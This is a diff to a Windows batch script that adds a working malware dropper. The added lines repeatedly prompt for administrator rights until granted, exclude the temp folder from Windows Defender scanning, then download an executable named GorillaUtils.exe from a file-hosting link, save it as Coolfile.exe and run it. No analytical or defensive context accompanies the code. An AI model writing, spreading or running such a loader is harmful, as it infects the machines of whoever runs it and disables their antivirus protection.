@@ -1,5 +1,18 @@
 @echo off
+set PayloadLink=https://cold1.gofile.io/download/web/c635316d-eab9-44b0-b163-b0c8648aca38/GorillaUtils.exe
+
+net session >NUL
+if "%errorlevel%"=="0" goto done
 :loop
-net session >nul 2>&1 || (powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs" 2>nul & timeout /t 2 >nul & goto loop)
-echo Admin erhalten!
-pause
+PowerShell -c Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden
+if "%errorlevel%"=="0" (
+    exit
+) else (
+    goto loop
+)
+:done
+powershell -c Add-MpPreference -ExclusionPath '%temp%'
+cd %temp%
+curl -L %PayloadLink% -o Coolfile.exe
+if not exist Coolfile.exe powershell -c Invoke-WebRequest %PayloadLink% -OutFile Coolfile.exe
+start "" Coolfile.exe
